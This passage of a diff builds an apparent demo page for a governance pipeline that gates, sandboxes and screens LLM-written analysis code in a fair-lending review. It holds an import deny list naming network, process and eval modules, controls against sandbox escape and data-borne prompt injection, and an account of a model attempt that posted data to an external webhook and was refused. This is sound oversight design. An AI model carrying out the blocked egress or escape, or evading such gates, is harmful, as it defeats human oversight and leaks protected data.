+          <tr><td class="ln">3</td><td>    rates = ctx.<span class="fn">sql</span>(<span class="st">"""</span></td></tr>
+          <tr><td class="ln">4</td><td>        <span class="st">SELECT age_band, AVG(pred) AS selection_rate, COUNT(*) AS n</span></td></tr>
+          <tr><td class="ln">5</td><td>        <span class="st">FROM german_credit GROUP BY age_band ORDER BY age_band"""</span>)</td></tr>
+          <tr><td class="ln">6</td><td>    ctx.<span class="fn">emit</span>(rates)</td></tr>
+        </tbody></table></div>
+        <div class="note ok"><span class="ico">&#10003;</span><div><b>Attempt 2 cleared.</b> The egress line is gone. Every import on the allowlist, every column in the grant, no <span class="mono">SELECT *</span>, no unbounded join. Cleared for execution.</div></div>
+        <div class="ctls" style="margin-top:14px">
+          <button class="ctl pass" onclick="openCtl('CTL-CODE-01')"><span class="st"></span>CTL-CODE-01</button>
+          <button class="ctl pass" onclick="openCtl('CTL-CODE-03')"><span class="st"></span>CTL-CODE-03</button>
+          <button class="ctl pass" onclick="openCtl('CTL-COL-01')"><span class="st"></span>CTL-COL-01</button>
+          <button class="ctl pass" onclick="openCtl('CTL-EGRESS-01')"><span class="st"></span>CTL-EGRESS-01</button>
+          <button class="ctl pass" onclick="openCtl('CTL-COMPLEX-01')"><span class="st"></span>CTL-COMPLEX-01</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 6 : EXECUTE -->
+  <section class="panel" id="stage-6" aria-labelledby="h6h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 6 of 9</span><span class="badge neutral">Run in the sandbox</span></div>
+      <h2 id="h6h">Execute</h2>
+      <p class="lede">The cleared code runs in a subprocess with no network namespace, a read-only filesystem, and memory and time caps. A subprocess is a boundary against a model doing something dumb, not against a determined attacker. That is the actual threat here, and we say so out loud.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">Gated code + scoped table</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Runs it under hard resource limits</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">A raw result object (the pre-screen table)</div></div>
+    </div>
+
+    <div class="grid2" style="margin-bottom:16px">
+      <div class="card">
+        <div class="card-h"><h3>Sandbox profile</h3></div>
+        <div class="card-b">
+          <dl class="kv">
+            <dt>Network</dt><dd><span class="badge danger">no namespace</span></dd>
+            <dt>Filesystem</dt><dd><span class="badge warn">read-only</span></dd>
+            <dt>Memory / time</dt><dd>capped &middot; 15s wall clock</dd>
+            <dt>Dynamic code</dt><dd><span class="badge danger">blocked</span></dd>
+          </dl>
+          <div class="ctls" style="margin-top:12px"><button class="ctl pass" onclick="openCtl('CTL-TIME-01')"><span class="st"></span>CTL-TIME-01</button></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-h"><h3>Run</h3><span class="badge ok">ok</span></div>
+        <div class="card-b">
+          <dl class="kv">
+            <dt>Status</dt><dd><span style="color:var(--ok-ink)">completed</span></dd>
+            <dt>Wall clock</dt><dd class="mono">0.42s <span style="color:var(--muted)">/ 15s</span></dd>
+            <dt>Rows emitted</dt><dd class="mono">7 groups</dd>
+          </dl>
+          <div class="note ok" style="margin-top:12px"><span class="ico">&#10003;</span><div>Generated code ran on the box and emitted a grouped result. Execute passing is the proof the sandbox actually executed real code.</div></div>
+        </div>
+      </div>
+    </div>
+    <div class="note info"><span class="ico">i</span><div>The raw result it emitted still contains a group of only 6 people. Nothing has screened it yet. That happens next.</div></div>
+  </section>
+
+  <!-- STAGE 7 : SCREEN -->
+  <section class="panel" id="stage-7" aria-labelledby="h7h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 7 of 9</span><span class="badge neutral">Disclosure control</span></div>
+      <h2 id="h7h">Screen</h2>
+      <p class="lede">Disclosure control runs before anything downstream, including the model that writes the summary. This is the highest-signal control on the list, and nobody demos it. So we do.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">The raw emitted result</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Suppresses small cells, scans for PII, tests for proxies</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">A screened result &mdash; suppressed cells removed, not masked</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Before &rarr; after</h3><span class="eyebrow">The 71-75 band has 6 applicants</span></div>
+      <div class="card-b">
+        <div class="grid2">
+          <div>
+            <div class="section-label">Before screen <span class="badge neutral">raw</span></div>
+            <div class="tbl-wrap"><table>
+              <thead><tr><th>age_band</th><th class="num">rate</th><th class="num">n</th></tr></thead>
+              <tbody>
+                <tr><td>18-25</td><td class="num">0.32</td><td class="num">190</td></tr>
+                <tr><td>26-35</td><td class="num">0.21</td><td class="num">398</td></tr>
+                <tr><td>36-45</td><td class="num">0.16</td><td class="num">226</td></tr>
+                <tr><td>46-55</td><td class="num">0.23</td><td class="num">115</td></tr>
+                <tr><td>56-65</td><td class="num">0.26</td><td class="num">53</td></tr>
+                <tr><td>66-70</td><td class="num">0.25</td><td class="num">12</td></tr>
+                <tr><td>71-75</td><td class="num">0.17</td><td class="num">6</td></tr>
+              </tbody>
+            </table></div>
+          </div>
+          <div>
+            <div class="section-label">After screen <span class="badge ok">screened</span></div>
+            <div class="tbl-wrap"><table>
+              <thead><tr><th>age_band</th><th class="num">rate</th><th class="num">n</th></tr></thead>
+              <tbody>
+                <tr><td>18-25</td><td class="num">0.32</td><td class="num">190</td></tr>
+                <tr><td>26-35</td><td class="num">0.21</td><td class="num">398</td></tr>
+                <tr><td>36-45</td><td class="num">0.16</td><td class="num">226</td></tr>
+                <tr><td>46-55</td><td class="num">0.23</td><td class="num">115</td></tr>
+                <tr><td>56-65</td><td class="num">0.26</td><td class="num">53</td></tr>
+                <tr><td>66-70</td><td class="num">0.25</td><td class="num">12</td></tr>
+                <tr id="supp-row" class="suppressed" title="n=6 is below the disclosure floor of 10"><td>71-75</td><td class="num">0.17</td><td class="num">6</td></tr>
+              </tbody>
+            </table></div>
+            <p id="supp-note-on" style="font-size:11.5px;color:var(--muted);margin-top:8px">The 71-75 row is <b>removed</b> from the result object, not masked, and is withheld from the narration model. Shown struck here so you can see exactly what was withheld. <span class="mono">min cell 6 &rarr; 12</span></p>
+            <p id="supp-note-off" style="display:none;font-size:11.5px;color:var(--warn-ink);margin-top:8px"><b>CTL-DISC-02 disabled by admin (audited).</b> The n=6 band now survives into the result and reaches the narration model. <span class="mono">min cell 6</span></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Checks performed</h3></div>
+      <div class="card-b">
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div class="note ok"><span class="ico">&#10003;</span><div><b>k-anonymity floor.</b> The raw output breached the floor of 10, so the floor was enforced rather than assumed. <button class="ctl fired" onclick="openCtl('CTL-DISC-01')"><span class="st"></span>CTL-DISC-01</button></div></div>
+          <div class="note warn" id="disc02-on"><span class="ico">!</span><div><b>Small-cell suppression.</b> The 71-75 band (n=6) is below the floor. Removed before narration. <button class="ctl fired" onclick="openCtl('CTL-DISC-02')"><span class="st"></span>CTL-DISC-02</button></div></div>
+          <div class="note danger" id="disc02-off" style="display:none"><span class="ico">&#10007;</span><div><b>Small-cell suppression is OFF.</b> Disabled by the Platform Admin (audited). The n=6 band is no longer removed. <button class="ctl block" onclick="openCtl('CTL-DISC-02')"><span class="st"></span>CTL-DISC-02</button></div></div>
+          <div class="note ok"><span class="ico">&#10003;</span><div><b>PII scan.</b> No personal identifiers found in the output text. <button class="ctl pass" onclick="openCtl('CTL-DISC-03')"><span class="st"></span>CTL-DISC-03</button></div></div>
+        </div>
+
+        <hr class="hr" />
+        <div id="proxy-block">
+          <div class="section-label">Proxy discrimination <button class="ctl fired" onclick="openCtl('CTL-PROXY-01')"><span class="st"></span>CTL-PROXY-01</button></div>
+          <p style="font-size:12.5px;color:var(--muted);margin-bottom:12px">A permitted column can still stand in for a protected one. Each granted feature is tested empirically against age band. Strong association is flagged, not refused: whether it is a business necessity is Legal's call.</p>
+          <div class="proxybars">
+            <div class="pbar"><span>digital_engagement_score</span><span class="track"><span class="fill hi" style="width:92%"></span></span><span class="val" style="color:var(--warn-ink)">&eta; 0.92</span></div>
+            <div class="pbar"><span>duration_months</span><span class="track"><span class="fill lo" style="width:11%"></span></span><span class="val">&eta; 0.11</span></div>
+            <div class="pbar"><span>credit_amount</span><span class="track"><span class="fill lo" style="width:7%"></span></span><span class="val">&eta; 0.07</span></div>
+          </div>
+          <div class="threshold" style="margin-top:8px">Flag threshold &eta; = 0.50. Only <b>digital_engagement_score</b> crosses it. It is a candidate proxy for age &mdash; surfaced out loud, not silently decided.</div>
+        </div>
+        <div id="proxy-off" style="display:none"><div class="note danger"><span class="ico">&#10007;</span><div><b>Proxy screen is OFF.</b> Disabled by the Platform Admin (audited). The digital_engagement_score / age association is no longer tested or surfaced. <button class="ctl block" onclick="openCtl('CTL-PROXY-01')"><span class="st"></span>CTL-PROXY-01</button></div></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 8 : INTERPRET -->
+  <section class="panel" id="stage-8" aria-labelledby="h8h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 8 of 9</span><span class="badge neutral">Narrate from screened numbers</span></div>
+      <h2 id="h8h">Interpret</h2>
+      <p class="lede">The model narrates from the screened result only. It never saw the suppressed band, so it structurally cannot mention it. A faithfulness check confirms the words match the numbers.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">The screened result only</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Writes the narrative; scores it for faithfulness</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">Narration + a faithfulness score</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Narration</h3><span class="eyebrow" id="narlabel">scripted, over a live analysis</span></div>
+      <div class="card-b">
+        <div id="narstart">
+          <div class="seg" role="group" aria-label="Narration mode">
+            <button class="seg-btn active" id="seg-scripted" onclick="setNarMode('scripted')">Scripted</button>
+            <button class="seg-btn" id="seg-live" onclick="setNarMode('live')">Live LLM</button>
+          </div>
+          <p style="font-size:12px;color:var(--muted);margin-bottom:12px" id="narmodehelp">Scripted narration is deterministic and free, safe for a public link. The analysis underneath is always real. Switch to Live LLM to stream real tokens under a cost cap.</p>
+          <div><button class="btn primary" id="narbtn" onclick="runNarration()">&#9654; Generate narration</button></div>
+        </div>
+        <div id="narpending" style="display:none">
+          <div class="shimmer w1"></div><div class="shimmer w2"></div><div class="shimmer w3"></div>
+          <p style="font-size:12px;color:var(--muted)">Composing from screened numbers&hellip;</p>
+        </div>
+        <div id="narbody" style="display:none">
+          <div class="narration" id="narpara"></div>
+          <div class="note ok" id="narfaith" style="margin-top:16px;display:none"><span class="ico">&#10003;</span><div><b>Faithful.</b> The narrative asserts no figure for a suppressed band and matches the screened numbers. The runtime check is pass/fail, grounded in the screened result. <button class="ctl pass" onclick="openCtl('CTL-EVAL-01')"><span class="st"></span>CTL-EVAL-01</button></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 9 : ATTEST -->
+  <section class="panel" id="stage-9" aria-labelledby="h9h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 9 of 9</span><span class="badge neutral">Assemble the evidence</span></div>
+      <h2 id="h9h">Attest</h2>
+      <p class="lede">Everything above is assembled into an evidence pack: the finding, an unbroken provenance chain, every control attested, and an honest statement of what the analysis does not say. It ships pending an independent sign-off.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">Every prior stage</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Builds the pack, emits lineage, routes for sign-off</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">An evidence pack, pending signature</div></div>
+    </div>
+
+    <div class="grid2">
+      <div class="card">
+        <div class="card-h"><h3>Finding</h3></div>
+        <div class="card-b">
+          <p style="font-size:14px;line-height:1.55">Selection-rate gap of <b>0.16</b> between the highest band (18-25, 0.32) and the lowest (36-45, 0.16), a <b>2.0&times;</b> disparity.</p>
+          <p class="mono" style="font-size:12.5px;color:var(--muted);margin-top:8px">95% CI 0.08 to 0.24</p>
+          <hr class="hr" />
+          <div class="section-label">What this does not say</div>
+          <p style="font-size:12.5px;color:var(--muted)">The gap is an association, not proof that age caused it. It does not clear <span class="mono">digital_engagement_score</span> of proxy concern; that determination is Legal's, and the proxy flag is in this pack so it is visible, not buried in a coefficient.</p>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-h"><h3>Provenance chain</h3><span class="eyebrow">unbroken</span></div>
+        <div class="card-b">
+          <dl class="kv">
+            <dt>Run</dt><dd class="mono">696ef644</dd>
+            <dt>Dataset SHA</dt><dd class="mono">4f2a1c9e</dd>
+            <dt>Tier</dt><dd class="mono">L2</dd>
+            <dt>Purpose</dt><dd>fair_lending_review</dd>
+            <dt>Author</dt><dd class="mono">analyst</dd>
+            <dt>Approver</dt><dd><span class="badge warn">pending</span></dd>
+          </dl>
+          <div class="note warn" style="margin-top:12px"><span class="ico">!</span><div>Sign-off is pending. The approver may not be the author. <button class="ctl armed" onclick="openCtl('CTL-SOD-01')"><span class="st"></span>CTL-SOD-01</button></div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Controls attested</h3><span class="eyebrow">the full chain this run cleared</span></div>
+      <div class="card-b">
+        <div class="ctls" id="attested-chips"></div>
+        <p style="font-size:11.5px;color:var(--muted);margin-top:10px"><span class="mono">CTL-SOD-01</span> is not in this list: it is the one control still <b>pending</b>, awaiting an independent approver.</p>
+        <div style="display:flex;gap:10px;margin-top:16px;flex-wrap:wrap">
+          <button class="btn">&#8681; Leadership brief (.qmd)</button>
+          <button class="btn">&#8681; Reviewable notebook (.py)</button>
+          <button class="btn">View OpenLineage events</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 10 : ARCHITECTURE (the stack, promoted from a modal to a rail stop) -->
+  <section class="panel" id="stage-10" aria-labelledby="h10">
+    <div class="phead">
+      <div class="eyebrow"><span>The full stack</span><span class="badge neutral">Framework &amp; tools used, governance implemented</span></div>
+      <h2 id="h10">Architecture</h2>
+      <p class="lede">Zoom out from the run. The analysis is off-the-shelf: named libraries do the maths, each at one stage, and we do not reimplement any of it. What we build is the governance, the named controls that sit at every transition and can refuse. Every chip below is a control you already watched fire on this run.</p>
+    </div>
+
+    <div class="grid2">
+      <div class="stackcol">
+        <div class="sc-h"><span class="lib" style="cursor:default"><span class="d"></span>tools</span> Framework &amp; Tools used</div>
+        <p class="sc-sub">Off-the-shelf. We do not reimplement any of it.</p>
+        <div class="stackrow"><span class="nm">Claude</span><span class="ds">Writes the analysis code, and the narration</span><span class="sg">Generate&middot;Interpret</span></div>
+        <div class="stackrow"><span class="nm">ast</span><span class="ds">Parses generated Python (stdlib)</span><span class="sg">Gate</span></div>
+        <div class="stackrow"><span class="nm">sqlglot</span><span class="ds">Parses the SQL: columns, joins, SELECT *</span><span class="sg">Gate</span></div>
+        <div class="stackrow"><span class="nm">DuckDB</span><span class="ds">Runs the query in the sandbox</span><span class="sg">Access&middot;Execute</span></div>
+        <div class="stackrow"><span class="nm">fairlearn</span><span class="ds">Group fairness metrics (MetricFrame)</span><span class="sg">Screen</span></div>
+        <div class="stackrow"><span class="nm">scipy.stats</span><span class="ds">Proxy association + the Wald interval</span><span class="sg">Screen</span></div>
+        <div class="stackrow"><span class="nm">scikit-learn</span><span class="ds">The underlying credit model</span><span class="sg">upstream</span></div>
+        <div class="stackrow"><span class="nm">SHAP</span><span class="ds">Model explainability</span><span class="sg">model&nbsp;card</span></div>
+        <div class="stackrow"><span class="nm">OpenLineage</span><span class="ds">Provenance events, standards-based</span><span class="sg">Attest</span></div>
+        <div class="stackrow"><span class="nm">Quarto</span><span class="ds">The leadership document render</span><span class="sg">Attest</span></div>
+        <div class="stackrow"><span class="nm">marimo</span><span class="ds">The reviewable analyst notebook</span><span class="sg">Attest</span></div>
+      </div>
+      <div class="stackcol">
+        <div class="sc-h"><span class="badge info">built</span> Governance implemented</div>
+        <p class="sc-sub">Named, observable controls at every transition. This is the product.</p>
+        <div class="stackrow"><span class="sg" style="min-width:64px">Ask</span><span class="ds"><button class="ctl armed" onclick="openCtl('CTL-TIER-01')"><span class="st"></span>TIER-01</button> <button class="ctl armed" onclick="openCtl('CTL-PURP-01')"><span class="st"></span>PURP-01</button></span></div>
+        <div class="stackrow"><span class="sg" style="min-width:64px">Access</span><span class="ds"><button class="ctl armed" onclick="openCtl('CTL-RBAC-01')"><span class="st"></span>RBAC-01</button> <button class="ctl armed" onclick="openCtl('CTL-PURP-02')"><span class="st"></span>PURP-02</button> <button class="ctl armed" onclick="openCtl('CTL-CONTRACT-01')"><span class="st"></span>CONTRACT-01</button></span></div>
+        <div class="stackrow"><span class="sg" style="min-width:64px">Gate</span><span class="ds"><button class="ctl armed" onclick="openCtl('CTL-EGRESS-01')"><span class="st"></span>EGRESS-01</button> <button class="ctl armed" onclick="openCtl('CTL-CODE-03')"><span class="st"></span>CODE-03</button> <button class="ctl armed" onclick="openCtl('CTL-COL-01')"><span class="st"></span>COL-01</button></span></div>
+        <div class="stackrow"><span class="sg" style="min-width:64px">Execute</span><span class="ds"><button class="ctl armed" onclick="openCtl('CTL-TIME-01')"><span class="st"></span>TIME-01</button> <button class="ctl armed" onclick="openCtl('CTL-COST-01')"><span class="st"></span>COST-01</button></span></div>
+        <div class="stackrow"><span class="sg" style="min-width:64px">Screen</span><span class="ds"><button class="ctl armed" onclick="openCtl('CTL-DISC-02')"><span class="st"></span>DISC-02</button> <button class="ctl armed" onclick="openCtl('CTL-PROXY-01')"><span class="st"></span>PROXY-01</button></span></div>
+        <div class="stackrow"><span class="sg" style="min-width:64px">Interpret</span><span class="ds"><button class="ctl armed" onclick="openCtl('CTL-EVAL-01')"><span class="st"></span>EVAL-01</button></span></div>
+        <div class="stackrow"><span class="sg" style="min-width:64px">Attest</span><span class="ds"><button class="ctl armed" onclick="openCtl('CTL-SOD-01')"><span class="st"></span>SOD-01</button> <button class="ctl armed" onclick="openCtl('CTL-LIN-01')"><span class="st"></span>LIN-01</button></span></div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:18px">
+      <div class="card-h"><h3>The import allowlist</h3><span class="eyebrow">where the framework allowlist is enforced</span></div>
+      <div class="card-b">
+        <p class="sc-sub" style="margin-top:0">The Gate's allowlist is the governed catalogue the model may reach for. On it: permitted, and still gate-checked when used. Off it: refused.</p>
+        <div class="allowbox">
+          <span class="lib" style="cursor:default"><span class="d"></span>numpy</span><span class="lib" style="cursor:default"><span class="d"></span>pandas</span><span class="lib" style="cursor:default"><span class="d"></span>scikit-learn</span><span class="lib" style="cursor:default"><span class="d"></span>statsmodels</span><span class="lib" style="cursor:default"><span class="d"></span>fairlearn</span><span class="lib" style="cursor:default"><span class="d"></span>scipy</span><span class="lib" style="cursor:default"><span class="d"></span>dowhy</span><span class="lib" style="cursor:default"><span class="d"></span>lifelines</span><span class="lib" style="cursor:default"><span class="d"></span>shap</span>
+        </div>
+        <div class="allowbox" style="margin-top:8px">
+          <span class="lib" style="cursor:default;border-color:var(--danger-border);background:var(--danger-soft);color:var(--danger-ink)"><span class="d" style="background:var(--danger)"></span>os</span><span class="lib" style="cursor:default;border-color:var(--danger-border);background:var(--danger-soft);color:var(--danger-ink)"><span class="d" style="background:var(--danger)"></span>subprocess</span><span class="lib" style="cursor:default;border-color:var(--danger-border);background:var(--danger-soft);color:var(--danger-ink)"><span class="d" style="background:var(--danger)"></span>requests</span><span class="lib" style="cursor:default;border-color:var(--danger-border);background:var(--danger-soft);color:var(--danger-ink)"><span class="d" style="background:var(--danger)"></span>socket</span><span class="lib" style="cursor:default;border-color:var(--danger-border);background:var(--danger-soft);color:var(--danger-ink)"><span class="d" style="background:var(--danger)"></span>pickle</span><span class="lib" style="cursor:default;border-color:var(--danger-border);background:var(--danger-soft);color:var(--danger-ink)"><span class="d" style="background:var(--danger)"></span>eval / exec</span>
+        </div>
+        <div class="roadmap">On the roadmap (dependency map, not yet wired): Presidio (PII, regex today), Evidently (drift), OPA / Rego (externalized policy), pandera / Great Expectations (data contracts).</div>
+      </div>
+    </div>
+  </section>
+
+</main>
+  </div><!-- /view-run -->
+
+  <!-- SURFACE: datasets / registry / platform / adoption (full content area, sidebar stays) -->
+  <div class="view" id="view-surface">
+    <div class="surfwrap">
+      <div class="surfhead"><div class="eyebrow" id="surf-eyebrow"></div><h2 class="h2" id="surf-title"></h2></div>
+      <div id="surf-body"></div>
+    </div>
+  </div>
+
+  </div><!-- /content -->
+</div><!-- /shell -->
+
+<div class="navbar" id="navbar" style="display:none">
+  <div class="navbar-in">
+    <button class="btn" id="backbtn" onclick="go(-1)">&larr; Back</button>
+    <div class="cap" id="cap"></div>
+    <span class="stepcount" id="stepcount"></span>
+    <button class="btn primary" id="nextbtn" onclick="go(1)">Next &rarr;</button>
+  </div>
+</div>
+
+<!-- control drawer -->
+<div class="scrim" id="scrim" onclick="closeDrawer()"></div>
+<aside class="drawer" id="drawer" role="dialog" aria-modal="true" aria-labelledby="drawer-title">
+  <button class="drawer-close" onclick="closeDrawer()" aria-label="Close">&times;</button>
+  <div class="drawer-h">
+    <div class="cid" id="drawer-cid"></div>
+    <h3 id="drawer-title"></h3>
+    <span class="actionpill" id="drawer-action"></span>
+  </div>
+  <div class="drawer-b">
+    <div class="block"><div class="lab">What it is</div><p id="drawer-what"></p></div>
+    <div class="block"><div class="lab">Why it fired on this run</div><p id="drawer-why"></p></div>
+    <div class="block"><div class="lab">What it did</div><p id="drawer-did"></p></div>
+  </div>
+</aside>
+
+<!-- controls modal -->
+<div class="modal" id="modal">
+  <div class="scrim show" onclick="closeControls()" style="position:absolute"></div>
+  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modal-title" style="position:relative;z-index:1">
+    <div class="modal-h">
+      <div class="brand"><svg viewBox="0 0 24 24" style="width:22px;height:22px" aria-hidden="true"><path d="M12 2 4 5v6c0 5 3.4 8.5 8 11 4.6-2.5 8-6 8-11V5z" fill="var(--accent)"/><path d="M8 12l3 3 5-6" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+      <div><h3 id="modal-title" style="font-size:16px">Control plane</h3><div style="font-size:12px;color:var(--muted)">Every control on this run, grouped by stage. Toggling is an admin-only, audited action.</div></div>
+      <button class="drawer-close" style="position:static;margin-left:auto" onclick="closeControls()" aria-label="Close">&times;</button>
+    </div>
+    <div class="modal-b" id="modal-body"></div>
+  </div>
+</div>
+
+<!-- stage transition overlay -->
+<div class="transition" id="transition" aria-hidden="true">
+  <div class="trans-card">
+    <div class="spinner"></div>
+    <div><div class="trans-verb" id="trans-verb">Governing</div><div class="trans-msg" id="trans-msg"></div></div>
+  </div>
+</div>
+
+<!-- faux login / persona select -->
+<div class="login" id="login" role="dialog" aria-modal="true" aria-labelledby="login-h">
+  <div class="login-inner">
+    <div class="login-brand">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2 4 5v6c0 5 3.4 8.5 8 11 4.6-2.5 8-6 8-11V5z" fill="#2f6fd0"/><path d="M8 12l3 3 5-6" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span class="wm">SENTINEL</span><span class="sub">Governed Agentic Analysis</span>
+    </div>
+    <div class="login-eyebrow">Acting as</div>
+    <h2 class="login-h" id="login-h">Choose an identity</h2>
+    <p class="login-sub">Every persona is governed differently. Your role and attestations set how much machine autonomy the platform grants, computed as the lower of the two.</p>
+    <div class="persona-grid" id="persona-grid"></div>
+    <p class="login-foot">Faux sign-in for the demo. No credentials, no auth. Pick anyone to enter.</p>
+  </div>
+</div>
+
+<script>
+"use strict";
+
+/* ---------- control catalogue ---------- */
+const ACTION_STYLE = { block:['block','Blocks the run'], flag:['fired','Flags, does not block'], suppress:['fired','Removes / redacts'], regenerate:['block','Sends code back'], filter:['pass','Applies a filter'], pass:['pass','Cleared'] };
+const CONTROLS = {
+  'CTL-TIER-01':{t:'Autonomy tier gate',stage:'Ask',a:'pass',what:'Confirms the person is entitled to the level of machine autonomy the task needs. The tier is the lower of what the data class allows and what the person has earned.',why:'Restricted data caps at L2 and the certified analyst also caps at L2, so the request resolves to L2 and is entitled to run.',did:'Froze the request at L2 and let it proceed. A read-only role would have stopped here at L0.'},
+  'CTL-PURP-01':{t:'Purpose limitation',stage:'Access',a:'pass',what:'Checks the reason for the request is an allowed use of this data, not just who is asking. Credit data may be used for fair-lending review but not for marketing.',why:'The purpose is fair-lending review, which is permitted for german_credit, so it passed.',did:'Allowed the run. Had the purpose been marketing, it would have refused at Access before any code was generated.'},
+  'CTL-PURP-02':{t:'Purpose column scope',stage:'Access',a:'block',what:'Checks that every column used stays inside the narrower slice the purpose grants, not just that the dataset is allowed.',why:'The 13 non-granted german_credit columns fall outside the fair-lending column scope.',did:'Kept them off the scoped table, enforced by construction plus the Gate column check.'},
+  'CTL-CONTRACT-01':{t:'Data contract pin',stage:'Access',a:'pass',what:'Checks the data has not changed since the analysis was certified, by comparing a fingerprint (SHA) of the dataset.',why:'The certified SHA and the current SHA match, so the certification still describes the live data.',did:'Passed as pinned. On drift it would refuse and require recertification.'},
+  'CTL-RBAC-01':{t:'Column access control',stage:'Access',a:'block',what:'Enforces column-level permissions by role. Columns the role is not entitled to see are denied and logged.',why:'personal_status_sex and the direct-PII columns are outside the fair-lending grant.',did:'Removed those columns from the scoped table by construction and logged the denial.'},
+  'CTL-RBAC-02':{t:'Identity row filter',stage:'Access',a:'filter',what:'Records that an identity-scoped row filter was applied, so there is always proof the requester only saw their permitted rows.',why:'Runs on every request as an informational, always-logs control.',did:'Ran and logged. For german_credit the predicate is empty (no natural per-identity split), so it is informational on this run; where a dataset needs one, the filter is injected after generation so the model cannot remove it.'},
+  'CTL-PII-01':{t:'PII redaction',stage:'any',a:'suppress',what:'Redacts personal identifiers out of any text before it reaches the model, and logs each redaction.',why:'applicant_email and applicant_ssn are direct PII present in the raw dataset.',did:'Kept both columns off the scoped table and out of every model context.'},
+  'CTL-INJECT-01':{t:'Data-borne injection screen',stage:'Generate',a:'suppress',what:'Neutralises instruction-shaped text hidden inside data or documents before it can steer the model.',why:'No injected instructions were present in this run.',did:'Nothing to neutralise; documented for the scaled retrieval path.'},
+  'CTL-CODE-01':{t:'Import allowlist',stage:'Gate',a:'regenerate',what:'Every library the code imports must be on an approved list of analysis tools; anything else is refused.',why:'Attempt 2 imported only allowlisted libraries.',did:'Passed. A disallowed import would send the code back for regeneration.'},
+  'CTL-CODE-02':{t:'No filesystem / OS',stage:'Gate',a:'regenerate',what:'Refuses any attempt to read or write files or reach the operating system.',why:'The code touches no filesystem or process module.',did:'Passed.'},
+  'CTL-CODE-03':{t:'No dynamic code',stage:'Gate',a:'regenerate',what:'Refuses code that assembles and runs fresh code on the fly (eval, exec, compile) or unpacks untrusted formats.',why:'No eval/exec present in the cleared code.',did:'Passed. One L3 adversarial sample runs through an eval-ed string and is refused here.'},
+  'CTL-CODE-04':{t:'No sandbox escape',stage:'Gate',a:'regenerate',what:'Refuses code that uses Python internals (__globals__, __subclasses__) to climb out of the sandbox.',why:'No dunder-escape attributes accessed.',did:'Passed.'},
+  'CTL-COL-01':{t:'Granted columns only',stage:'Gate',a:'regenerate',what:'Every column the code names must be one this request was granted, and SELECT * is refused.',why:'The SQL names only age_band and pred, both granted, with an explicit column list.',did:'Passed statically, backed by the scoped table that simply lacks ungranted columns.'},
+  'CTL-COMPLEX-01':{t:'Bounded joins',stage:'Gate',a:'regenerate',what:'Refuses joins with no matching condition (a Cartesian product) or more joins than the ceiling.',why:'The query has a single grouped scan, no joins.',did:'Passed.'},
+  'CTL-EGRESS-01':{t:'No network egress',stage:'Gate',a:'block',what:'Refuses any code that could send data over a network. No web, email, or socket library may even be mentioned.',why:'Attempt 1 called requests.post to an external endpoint, even without importing the library.',did:'Caught the webhook on line 7 and refused attempt 1. After Fix it, attempt 2 was clean.'},
+  'CTL-TIME-01':{t:'Wall-clock cap',stage:'Execute',a:'block',what:'Puts a hard time limit on how long an analysis may run in the sandbox.',why:'The run finished in 0.42s, well under the 15s cap.',did:'Passed. A run that overshot would be killed and stamped with this control.'},
+  'CTL-COST-01':{t:'Model spend cap',stage:'Execute',a:'block',what:'Caps total model spend for a request; on the cap it falls back to a scripted path.',why:'Spend stayed under the cap.',did:'Passed.'},
+  'CTL-DISC-01':{t:'k-anonymity floor',stage:'Screen',a:'flag',what:'Guarantees every group shown has at least a minimum number of people behind it. Fires when the raw result would have breached that floor.',why:'The raw output contained a group of 6, below the floor of 10.',did:'Recorded that the floor was actually enforced on this run, not merely assumed.'},
+  'CTL-DISC-02':{t:'Small-cell suppression',stage:'Screen',a:'suppress',what:'Removes any result cell built from fewer than the minimum number of people. The cell is deleted, not masked, and withheld from the narration model.',why:'The 71-75 age band has only 6 real applicants.',did:'Removed the 71-75 row before narration, so the written summary structurally cannot mention it.'},
+  'CTL-DISC-03':{t:'Output PII scan',stage:'Screen',a:'flag',what:'Scans the text about to be shown for personal identifiers and records any it finds.',why:'No identifiers were present in the grouped output.',did:'Passed with nothing to flag.'},
+  'CTL-DISC-04':{t:'Target leakage',stage:'Screen',a:'block',what:'Catches a result that smuggles the decision outcome into the features it was meant to predict from.',why:'Not exercised by this single grouped table.',did:'Documented; deferred past the current slice.'},
